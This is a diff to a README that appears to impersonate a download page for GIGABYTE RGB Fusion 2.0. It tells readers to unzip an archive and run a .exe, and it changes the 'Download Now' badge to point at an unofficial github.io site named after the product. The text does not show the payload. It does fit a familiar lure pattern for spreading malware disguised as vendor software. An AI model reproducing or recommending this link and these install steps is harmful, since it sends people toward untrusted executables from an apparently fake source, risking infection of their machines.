@@ -11,7 +11,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install GIGABYTE RGB Fusion 2.0 and automatically detect supported devices.
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://gigabyte-rgb-fusion-2.github.io/.github/)
 
 ## 📸 Overview
 ![gigabyte-rgbfusion-rgb](https://github.com/user-attachments/assets/902e7ad4-0fbf-420d-9584-6294090c3ef1)
